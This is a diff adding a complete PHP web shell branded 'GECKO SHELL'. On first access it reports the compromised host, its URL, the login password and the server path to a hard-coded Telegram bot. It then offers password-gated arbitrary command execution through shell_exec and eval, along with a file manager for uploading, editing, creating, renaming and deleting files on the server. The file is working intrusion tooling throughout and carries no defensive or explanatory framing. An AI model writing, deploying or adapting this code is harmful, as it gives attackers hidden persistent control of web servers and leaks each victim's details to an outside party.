@@ -1,0 +1,281 @@
+<?php
+
+error_reporting(0);
+session_start();
+
+// Telegram Config (langsung kirim pas first access)
+$token = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
+$chat_id = '5070938778';
+$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[SCRIPT_NAME]";
+
+// AUTO SEND TO TELEGRAM (hanya sekali)
+if(!isset($_SESSION['notified'])) {
+    $message = "🐍 *GECKO SHELL DEPLOYED!*\n\n";
+    $message .= "📱 *Target:* `$_SERVER[HTTP_HOST]`\n";
+    $message .= "🔗 *Access URL:* `$current_url`\n";
+    $message .= "🔑 *Password:* `gecko`\n";
+    $message .= "⚡ *Path:* `".getcwd()."`\n";
+    $message .= "📊 *PHP:* `".phpversion()."`\n\n";
+    $message .= "*Be Exploiter Once More!* 🐍";
+
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'Markdown'];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
+    
+    $_SESSION['notified'] = true; // Mark as sent
+}
+
+// Simple auth
+if(!isset($_SESSION['auth'])) $_SESSION['auth'] = md5('tbl');
+if(isset($_POST['pass']) && md5($_POST['pass']) == $_SESSION['auth']) $_SESSION['logged'] = true;
+if(!isset($_SESSION['logged'])) {
+    die('<form method=post style="text-align:center;margin-top:100px;"><h2>🐍 GECKO SHELL</h2><input type=password name=pass placeholder="Password: gecko" style="padding:15px;font-size:18px;"><input type=submit value="LOGIN" style="padding:15px;font-size:18px;background:#00ff00;color:black;"></form>');
+}
+
+$cmd = $_POST['cmd'] ?? '';
+$path = $_POST['path'] ?? getcwd();
+chdir($path);
+
+function scan_dir($dir) {
+    $files = [];
+    $handle = opendir($dir);
+    while($file = readdir($handle)) {
+        if($file != '.' && $file != '..') $files[] = $file;
+    }
+    closedir($handle);
+    sort($files);
+    return $files;
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GECKO SHELL - Be Exploiter Once More</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; line-height: 1.4; }
+        .header { text-align: center; font-size: 28px; margin-bottom: 30px; border-bottom: 3px solid #00ff00; padding-bottom: 15px; text-shadow: 0 0 10px #00ff00; }
+        .panel { background: #111; padding: 20px; margin: 15px 0; border: 2px solid #333; border-radius: 8px; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        input, textarea, select { background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 12px; width: 100%; margin: 8px 0; font-family: monospace; font-size: 14px; border-radius: 4px; }
+        input:focus, textarea:focus { outline: none; box-shadow: 0 0 10px #00ff00; }
+        button { background: linear-gradient(45deg, #00ff00, #00cc00); color: #000; border: none; padding: 12px 24px; cursor: pointer; font-weight: bold; font-family: monospace; border-radius: 4px; margin: 5px; transition: all 0.3s; }
+        button:hover { background: linear-gradient(45deg, #00cc00, #009900); transform: scale(1.05); box-shadow: 0 0 15px #00ff00; }
+        .danger { background: linear-gradient(45deg, #ff4444, #cc0000) !important; color: white !important; }
+        .danger:hover { background: linear-gradient(45deg, #cc0000, #990000) !important; }
+        .file-list { max-height: 350px; overflow-y: auto; background: #000; padding: 15px; border-radius: 4px; }
+        .file-item { padding: 12px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 15px; }
+        .file-item:hover { background: #222; border-radius: 4px; }
+        .file-icon { font-size: 20px; }
+        .success { color: #00ff00; background: rgba(0,255,0,0.1); padding: 15px; border-radius: 4px; border-left: 4px solid #00ff00; margin: 10px 0; }
+        .error { color: #ff4444; background: rgba(255,68,68,0.1); padding: 15px; border-radius: 4px; border-left: 4px solid #ff4444; margin: 10px 0; }
+        .info { color: #00aaff; background: rgba(0,170,255,0.1); padding: 15px; border-radius: 4px; border-left: 4px solid #00aaff; margin: 10px 0; font-size: 14px; }
+        @media (max-width: 768px) { .header { font-size: 22px; } .panel { padding: 15px; } }
+    </style>
+</head>
+<body>
+    <div class="header">🐍 GECKO SHELL <span style="color:#ff4444;">Be Exploiter Once More</span> 🐍</div>
+    
+    <?php if(isset($_SESSION['notified'])): ?>
+    <div class="info">
+        ✅ Telegram notified! Check your bot for access URL.
+    </div>
+    <?php endif; ?>
+
+    <div class="panel">
+        <form method=post style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+            <input type=text name=path value="<?php echo htmlspecialchars($path); ?>" placeholder="Current Path" readonly style="flex: 1; background: #000;">
+            <button type=submit>CD</button>
+        </form>
+    </div>
+
+    <!-- CMD EXEC -->
+    <div class="panel">
+        <form method=post>
+            <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+            <textarea name=cmd rows=4 placeholder="Execute PHP/System commands... (id, whoami, ls -la, etc)"><?php echo htmlspecialchars($cmd); ?></textarea>
+            <button type=submit>🚀 EXECUTE</button>
+        </form>
+        <?php if($cmd): ?>
+            <div style="margin-top:15px; background:#000; padding:15px; border-radius:4px; max-height:200px; overflow:auto;">
+                <pre style="white-space:pre-wrap;"><?php 
+                ob_start();
+                if(strpos($cmd, 'php ') === 0) eval(substr($cmd, 4)); 
+                else echo htmlspecialchars(shell_exec($cmd)); 
+                ob_end_flush();
+                ?></pre>
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <!-- FILE MANAGER -->
+    <div class="panel">
+        <h3 style="margin-bottom:15px;">📁 File Manager (<?php echo count(scan_dir($path)); ?> items)</h3>
+        <div class="file-list">
+            <?php foreach(scan_dir($path) as $file): 
+                $fpath = $path.'/'.$file;
+                $isdir = is_dir($fpath);
+                $size = $isdir ? '-' : number_format(filesize($fpath)).'B';
+            ?>
+            <div class="file-item">
+                <span class="file-icon"><?php echo $isdir ? '📁' : '📄'; ?></span>
+                <span style="flex:1; font-weight:bold;"><?php echo htmlspecialchars($file); ?></span>
+                <span style="color:#aaa; font-size:12px;"><?php echo $size; ?></span>
+                
+                <!-- EDIT -->
+                <form method=post style="display:inline; margin-left:auto;">
+                    <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+                    <input type=hidden name=action value="edit">
+                    <input type=hidden name=target value="<?php echo htmlspecialchars($fpath); ?>">
+                    <button type=submit style="font-size:12px; padding:8px 12px;">✏️</button>
+                </form>
+                
+                <!-- RENAME -->
+                <form method=post style="display:inline;">
+                    <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+                    <input type=hidden name=action value="rename">
+                    <input type=hidden name=target value="<?php echo htmlspecialchars($fpath); ?>">
+                    <button type=submit style="font-size:12px; padding:8px 12px;">🔄</button>
+                </form>
+                
+                <!-- DELETE -->
+                <form method=post style="display:inline;">
+                    <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+                    <input type=hidden name=action value="delete">
+                    <input type=hidden name=target value="<?php echo htmlspecialchars($fpath); ?>">
+                    <button type=submit class="danger" style="font-size:12px; padding:8px 12px;" onclick="return confirm('Delete <?php echo htmlspecialchars($file); ?>?')">🗑️</button>
+                </form>
+            </div>
+            <?php endforeach; ?>
+        </div>
+    </div>
+
+    <!-- CREATE ACTIONS -->
+    <div class="panel" style="display:grid; grid-template-columns: 1fr 1fr; gap:20px;">
+        <div>
+            <h4 style="margin-bottom:10px;">➕ Create File</h4>
+            <form method=post>
+                <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+                <input type=hidden name=action value="create_file">
+                <input type=text name=filename placeholder="backdoor.php" required>
+                <textarea name=content rows=3 placeholder="<?php echo '// Your payload here'; ?>"></textarea>
+                <button type=submit>Create</button>
+            </form>
+        </div>
+        <div>
+            <h4 style="margin-bottom:10px;">📂 Create Directory</h4>
+            <form method=post>
+                <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+                <input type=hidden name=action value="create_dir">
+                <input type=text name=dirname placeholder="uploads" required>
+                <button type=submit>Create Dir</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- UPLOAD -->
+    <div class="panel">
+        <h4 style="margin-bottom:10px;">📤 Upload Files</h4>
+        <form method=post enctype="multipart/form-data">
+            <input type=hidden name=path value="<?php echo htmlspecialchars($path); ?>">
+            <input type=hidden name=action value="upload">
+            <input type=file name=file[] multiple>
+            <button type=submit>UPLOAD</button>
+        </form>
+    </div>
+
+<?php
+// ACTION HANDLER (all in one)
+$action = $_POST['action'] ?? '';
+$target = $_POST['target'] ?? '';
+
+switch($action) {
+    case 'create_file':
+        if(file_put_contents($path.'/'.$_POST['filename'], $_POST['content'])) {
+            echo '<div class="success">✅ File '.$_POST['filename'].' created!</div>';
+        } else echo '<div class="error">❌ Failed to create file</div>';
+        break;
+        
+    case 'create_dir':
+        if(mkdir($path.'/'.$_POST['dirname'])) {
+            echo '<div class="success">✅ Directory '.$_POST['dirname'].' created!</div>';
+        } else echo '<div class="error">❌ Failed to create directory</div>';
+        break;
+        
+    case 'delete':
+        if(is_dir($target)) {
+            if(rmdir($target)) echo '<div class="success">✅ Directory deleted!</div>';
+            else echo '<div class="error">❌ Failed to delete directory</div>';
+        } else {
+            if(unlink($target)) echo '<div class="success">✅ File deleted!</div>';
+            else echo '<div class="error">❌ Failed to delete file</div>';
+        }
+        break;
+        
+    case 'rename':
+        echo '<div class="panel">
+            <h3>🔄 Rename: '.basename($target).'</h3>
+            <form method=post>
+                <input type=hidden name=path value="'.htmlspecialchars($path).'">
+                <input type=hidden name=action value="do_rename">
+                <input type=hidden name=target value="'.htmlspecialchars($target).'">
+                <input type=text name=newname placeholder="New name..." required style="width:70%;">
+                <button type=submit>Rename</button> <a href="?path='.htmlspecialchars($path).'" style="color:#00ff00;">Cancel</a>
+            </form></div>';
+        if($action == 'do_rename' && rename($target, dirname($target).'/'.$_POST['newname'])) {
+            echo '<div class="success">✅ Renamed successfully!</div>';
+        }
+        break;
+        
+    case 'upload':
+        $uploaded = 0;
+        if(isset($_FILES['file'])) {
+            foreach($_FILES['file']['name'] as $i => $name) {
+                if($_FILES['file']['error'][$i] == 0 && move_uploaded_file($_FILES['file']['tmp_name'][$i], $path.'/'.$name)) {
+                    $uploaded++;
+                }
+            }
+        }
+        echo $uploaded ? '<div class="success">✅ '.$uploaded.' files uploaded!</div>' : '<div class="error">❌ Upload failed</div>';
+        break;
+        
+    case 'edit':
+        if(file_exists($target)) {
+            $content = file_get_contents($target);
+            echo '<div class="panel">
+                <h3>✏️ Editing: '.basename($target).'</h3>
+                <form method=post>
+                    <input type=hidden name=path value="'.htmlspecialchars($path).'">
+                    <input type=hidden name=action value="save">
+                    <input type=hidden name=target value="'.htmlspecialchars($target).'">
+                    <textarea name=content rows=20 style="font-size:13px;">'.htmlspecialchars($content).'</textarea>
+                    <button type=submit style="margin-right:10px;">💾 Save</button>
+                    <a href="?path='.htmlspecialchars($path).'" style="color:#00ff00;">← Back</a>
+                </form></div>';
+        }
+        break;
+        
+    case 'save':
+        if(file_put_contents($target, $_POST['content']) !== false) {
+            echo '<div class="success">✅ File saved!</div>';
+        } else echo '<div class="error">❌ Failed to save</div>';
+        break;
+}
+?>
+
+    <div style="margin-top:40px; padding:20px; background:#111; border-radius:8px; text-align:center; font-size:13px; opacity:0.7;">
+        🐍 Path: <strong><?php echo htmlspecialchars(getcwd()); ?></strong> | 
+        PHP <?php echo phpversion(); ?> | 
+        <?php echo $_SESSION['notified'] ? 'Telegram ✅' : 'Notifying...'; ?>
+    </div>
+</body>
+</html>
